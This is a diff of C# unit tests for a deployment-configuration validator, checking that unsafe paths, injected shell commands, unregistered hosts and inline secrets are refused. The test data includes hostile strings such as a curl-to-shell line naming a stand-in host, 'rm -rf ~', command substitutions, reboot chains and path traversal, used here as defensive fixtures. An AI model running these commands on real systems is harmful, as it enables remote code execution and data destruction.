@@ -178,14 +178,181 @@ public sealed class ProjectDefinitionSchemaTwoTests
             issue.Code == "production-protection-required" && issue.Path == "environments[1].protected");
     }
 
+    [Fact]
+    public void Protected_staging_is_refused()
+    {
+        var result = ProjectDefinitionReader.Parse(Replace(Valid, "    protected: false\n", "    protected: true\n"));
+
+        Assert.Contains(result.Issues, issue =>
+            issue.Code == "staging-protection-unsupported" && issue.Path == "environments[0].protected");
+    }
+
+    /// <summary>Shell metacharacters, traversal, the filesystem root, and paths outside /srv.</summary>
+    public static TheoryData<string> UnsafeRemotePaths() => new()
+    {
+        "/srv/x;curl${IFS}evil|sh", "/srv/$(id)", "/srv/`id`", "/srv/x&&reboot", "/srv/x>y", "/srv/x y",
+        "/srv/a*", "/srv/~root", "/srv/x\\y", "//", "/.", "/", "/srv", "/srv/", "/srv/.", "/srv/..",
+        "/srv/../etc", "/srv/www/../../etc", "/srv/./www", "/srv//www", "/srv/-rf", "/etc/nginx", "/srvx/www", "srv/www",
+    };
+
+    [Theory]
+    [MemberData(nameof(UnsafeRemotePaths))]
+    public void Static_site_directory_refuses_unsafe_paths(string directory)
+    {
+        var result = ProjectDefinitionReader.Parse(Replace(Valid,
+            "    directory: /srv/www/_staging/studio\n", $"    directory: \"{directory}\"\n"));
+
+        Assert.Contains(result.Issues, issue => issue.Code == "deploy-directory-invalid" && issue.Path == "deploy[0].directory");
+    }
+
+    /// <summary>The same classes of unsafe path, each with a compose suffix that must not rescue it.</summary>
+    public static TheoryData<string> UnsafeComposeFiles() => new()
+    {
+        "/srv/x;curl${IFS}evil|sh.yml", "/srv/$(id).yml", "/srv/`id`/compose.yml", "/srv/x&&reboot.yml", "/srv/x y/compose.yml",
+        "//compose.yml", "/./compose.yml", "/compose.yml", "/srv/./compose.yml", "/srv/../compose.yml",
+        "/srv/../etc/compose.yml", "/srv//compose.yml", "/srv/-f.yml", "/etc/compose.yml", "/srvx/compose.yml",
+        "srv/compose.yml", "/srv/apps/api/compose.json", "/srv/apps/api/compose.yml;id", "/srv/apps/api/compose.yml/..",
+    };
+
+    [Theory]
+    [MemberData(nameof(UnsafeComposeFiles))]
+    public void Container_compose_file_refuses_unsafe_paths(string composeFile)
+    {
+        var result = ProjectDefinitionReader.Parse(Replace(Valid,
+            "    composeFile: /srv/apps/api/compose.yml\n", $"    composeFile: \"{composeFile}\"\n"));
+
+        Assert.Contains(result.Issues, issue => issue.Code == "deploy-compose-file-invalid" && issue.Path == "deploy[1].composeFile");
+    }
+
+    [Theory]
+    [InlineData("/srv/site")]
+    [InlineData("/srv/www/_staging/studio")]
+    [InlineData("/srv/a.b/c-d_e/.well-known")]
+    public void Remote_paths_below_srv_with_plain_segments_are_accepted(string directory)
+    {
+        var result = ProjectDefinitionReader.Parse(Replace(Valid,
+            "    directory: /srv/www/_staging/studio\n", $"    directory: {directory}\n"));
+
+        Assert.True(result.IsValid, Describe(result));
+    }
+
+    public static TheoryData<string> UnsafeArtifactPaths() => new()
+    {
+        "dist;rm -rf ~", "$(id)", "`id`", "dist|sh", "dist&&x", "dist x", "../dist", "dist/../..", "dist/./x", "./dist",
+        "..", "/dist", "~/dist", "-rf", "dist/-x", "dist//x", "dist\\x", "dist*",
+    };
+
+    [Theory]
+    [MemberData(nameof(UnsafeArtifactPaths))]
+    public void Artifact_path_fields_refuse_unsafe_paths(string path)
+    {
+        var bundle = ProjectDefinitionReader.Parse(Replace(Valid, "    path: dist\n", $"    path: \"{path}\"\n"));
+        var dockerfile = ProjectDefinitionReader.Parse(Replace(Valid, "    dockerfile: Dockerfile\n", $"    dockerfile: \"{path}\"\n"));
+        var context = ProjectDefinitionReader.Parse(Replace(Valid,
+            "    dockerfile: Dockerfile\n", $"    dockerfile: Dockerfile\n    path: \"{path}\"\n"));
+
+        Assert.Contains(bundle.Issues, issue => issue.Code == "artifact-path-invalid" && issue.Path == "artifacts[0].path");
+        Assert.Contains(dockerfile.Issues, issue => issue.Code == "artifact-dockerfile-invalid" && issue.Path == "artifacts[1].dockerfile");
+        Assert.Contains(context.Issues, issue => issue.Code == "artifact-path-invalid" && issue.Path == "artifacts[1].path");
+    }
+
+    [Fact]
+    public void Artifact_paths_accept_hidden_directories_and_the_repository_root_as_build_context()
+    {
+        var yaml = Replace(Replace(Valid, "    path: dist\n", "    path: .output/public\n"),
+            "    dockerfile: Dockerfile\n", "    dockerfile: docker/Dockerfile.prod\n    path: .\n");
+
+        var result = ProjectDefinitionReader.Parse(yaml);
+
+        Assert.True(result.IsValid, Describe(result));
+    }
+
+    [Theory]
+    [InlineData("    target: web-vm\n", "    target: \"web-vm;id\"\n", "deploy[0].target", "deploy-target-invalid")]
+    [InlineData("    target: run-host\n", "    target: \"$(id)\"\n", "deploy[1].target", "deploy-target-invalid")]
+    [InlineData("    service: api\n", "    service: \"api;reboot\"\n", "deploy[1].service", "deploy-service-invalid")]
+    [InlineData("    service: api\n", "    service: \"-api\"\n", "deploy[1].service", "deploy-service-invalid")]
+    public void Ssh_step_names_refuse_shell_metacharacters(string before, string after, string path, string code)
+    {
+        var result = ProjectDefinitionReader.Parse(Replace(Valid, before, after));
+
+        Assert.Contains(result.Issues, issue => issue.Code == code && issue.Path == path);
+    }
+
+    private static readonly ProjectDeployHostRegistry RegisteredHosts = new(new Dictionary<string, IReadOnlyList<string>>
+    {
+        ["staging"] = ["web-vm"],
+        ["production"] = ["run-host", "web-vm"],
+    });
+
+    [Fact]
+    public void Targets_registered_for_their_environments_are_accepted()
+    {
+        var result = ProjectDefinitionReader.Parse(Valid, hosts: RegisteredHosts);
+
+        Assert.True(result.IsValid, Describe(result));
+    }
+
+    [Fact]
+    public void A_target_not_registered_for_its_environment_is_refused_on_its_line()
+    {
+        var yaml = Replace(Valid, "    target: web-vm\n", "    target: run-host\n");
+
+        var result = ProjectDefinitionReader.Parse(yaml, hosts: RegisteredHosts);
+
+        var issue = Assert.Single(result.Issues);
+        Assert.Equal(("deploy-target-unregistered", "deploy[0].target"), (issue.Code, issue.Path));
+        Assert.Equal(LineOf(yaml, "    target: run-host"), issue.Line);
+        Assert.Contains("staging: web-vm", issue.Message, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public void A_step_for_every_environment_needs_its_target_registered_for_each()
+    {
+        var unscoped = Replace(Valid, "    healthTimeoutSeconds: 120\n    environments: [production]\n", "    healthTimeoutSeconds: 120\n");
+
+        var result = ProjectDefinitionReader.Parse(unscoped, hosts: RegisteredHosts);
+        var shapeOnly = ProjectDefinitionReader.Parse(unscoped);
+
+        var issue = Assert.Single(result.Issues);
+        Assert.Equal(("deploy-target-unregistered", "deploy[1].target"), (issue.Code, issue.Path));
+        Assert.Contains("registered for staging (", issue.Message, StringComparison.Ordinal);
+        Assert.True(shapeOnly.IsValid, Describe(shapeOnly));
+    }
+
+    [Fact]
+    public void Without_registered_hosts_every_target_is_refused()
+    {
+        var empty = new ProjectDeployHostRegistry(new Dictionary<string, IReadOnlyList<string>>());
+
+        var result = ProjectDefinitionReader.Parse(Valid, hosts: empty);
+
+        Assert.Equal(["deploy[0].target", "deploy[1].target"],
+            result.Issues.Where(issue => issue.Code == "deploy-target-unregistered").Select(issue => issue.Path));
+    }
+
     public static TheoryData<string, string> InlineSecrets() => new()
     {
         // Credential-shaped values are assembled at runtime (AGENTS.md fixture rule).
         { "API_TOKEN", "abc" + "123" },
         { "SMTP_PASSWORD", "hunter" + "2" },
+        { "DB_PASS", "hunter" + "2" },
+        { "STRIPE_KEY", "abc" + "123" },
+        { "SECRET_KEY_BASE", "abc" + "123" },
+        { "dbPassword", "hunter" + "2" },
+        { "GITHUBAUTHTOKEN", "abc" + "123" },
+        { "SQL_CONNECTION_STRING", "Server=db;Database=app" },
         { "DATABASE_URL", "postgres://app:" + "pw" + "@db.internal/app" },
+        { "WEBHOOK_URL", "https://hooks.example.test/notify?channel=ops&" + "token=" + "abc123" },
+        { "REPORT_URL", "https://example.test/report?" + "api_key=" + "abc123" },
+        { "SQL_SERVER", "Server=db;User Id=app;" + "Password=" + "pw" },
         { "SIGNING_MATERIAL", "-----BEGIN " + "PRIVATE KEY-----" },
         { "UPSTREAM_AUTH", "Bearer " + "abc.def" },
+        { "UPSTREAM_BASIC", "Basic " + Convert.ToBase64String("app:pw-value"u8.ToArray()) },
+        { "SESSION", "eyJ" + "hbGciOiJIUzI1NiJ9" + ".eyJ" + "zdWIiOiIxIn0" + ".sig" },
+        { "PAYMENTS", "sk_" + "live_" + new string('a', 24) },
+        { "CI_ACCESS", "gh" + "p_" + new string('b', 36) },
+        { "CLOUD_ACCESS_ID", "AK" + "IA" + new string('C', 16) },
     };
 
     [Theory]
@@ -198,6 +365,24 @@ public sealed class ProjectDefinitionSchemaTwoTests
 
         Assert.Contains(result.Issues, issue => issue.Code == "secret-value-inline" && issue.Path == "variables[0].value");
         Assert.DoesNotContain(result.Issues, issue => issue.Message.Contains(value, StringComparison.Ordinal));
+    }
+
+    [Theory]
+    [InlineData("TOKEN_TTL", "3600")]
+    [InlineData("PASSWORD_MIN_LENGTH", "12")]
+    [InlineData("KEYBOARD_LAYOUT", "de")]
+    [InlineData("STRIPE_PUBLISHABLE_KEY", "pk-demo")]
+    [InlineData("CACHE_KEY", "v1")]
+    [InlineData("BYPASS_CACHE", "true")]
+    [InlineData("PLAN_NAME", "Basic tier")]
+    [InlineData("PUBLIC_URL", "https://example.test/docs?page=2&keyword=deploy")]
+    public void Plain_configuration_under_harmless_names_is_accepted(string name, string value)
+    {
+        var yaml = Replace(Valid, "  - name: LOG_LEVEL\n    value: info\n", $"  - name: {name}\n    value: \"{value}\"\n");
+
+        var result = ProjectDefinitionReader.Parse(yaml);
+
+        Assert.True(result.IsValid, Describe(result));
     }
 
     [Theory]
@@ -306,6 +491,38 @@ public sealed class ProjectDefinitionSchemaTwoTests
                 .Select(item => item.GetProperty("properties").GetProperty("type").GetProperty("const").GetString()));
         Assert.Equal(ProjectDeploymentVocabulary.VariableKeys,
             properties.GetProperty("variables").GetProperty("items").GetProperty("properties").EnumerateObject().Select(item => item.Name));
+    }
+
+    [Fact]
+    public void Json_schema_uses_the_validator_patterns()
+    {
+        using var schema = JsonDocument.Parse(File.ReadAllText(
+            Path.Combine(RepositoryRoot.Find(), "docs", "app", "schemas", "project-execution.schema.json")));
+        var root = schema.RootElement;
+        var definitions = root.GetProperty("$defs");
+        string Pattern(JsonElement element) => element.GetProperty("pattern").GetString()!;
+        string Reference(JsonElement element) => element.GetProperty("$ref").GetString()!;
+
+        Assert.Equal(ProjectDeploymentVocabulary.RemotePathPattern, Pattern(definitions.GetProperty("remotePath")));
+        Assert.Equal(ProjectDeploymentVocabulary.ArtifactPathPattern, Pattern(definitions.GetProperty("artifactPath")));
+        Assert.Equal(ProjectDeploymentVocabulary.IdentifierPattern, Pattern(definitions.GetProperty("identifier")));
+
+        var step = root.GetProperty("properties").GetProperty("deploy").GetProperty("items").GetProperty("properties");
+        Assert.Equal("#/$defs/remotePath", Reference(step.GetProperty("directory")));
+        var compose = step.GetProperty("composeFile").GetProperty("allOf");
+        Assert.Equal("#/$defs/remotePath", Reference(compose[0]));
+        Assert.Equal(ProjectDeploymentVocabulary.ComposeFilePattern, Pattern(compose[1]));
+        Assert.Equal("#/$defs/identifier", Reference(step.GetProperty("service")));
+
+        var artifacts = root.GetProperty("properties").GetProperty("artifacts").GetProperty("items").GetProperty("oneOf");
+        Assert.Equal("#/$defs/artifactPath", Reference(artifacts[0].GetProperty("properties").GetProperty("path")));
+        Assert.Equal("#/$defs/artifactPath", Reference(artifacts[1].GetProperty("properties").GetProperty("dockerfile")));
+        Assert.Equal("#/$defs/artifactPath", Reference(artifacts[1].GetProperty("properties").GetProperty("path")));
+
+        Assert.Equal(ProjectDeploymentVocabulary.SecretReferencePattern,
+            Pattern(root.GetProperty("properties").GetProperty("variables").GetProperty("items").GetProperty("properties").GetProperty("secret")));
+        var staging = root.GetProperty("properties").GetProperty("environments").GetProperty("oneOf")[1].GetProperty("prefixItems")[0];
+        Assert.False(staging.GetProperty("properties").GetProperty("protected").GetProperty("const").GetBoolean());
     }
 
     private static string Replace(string text, string before, string after)
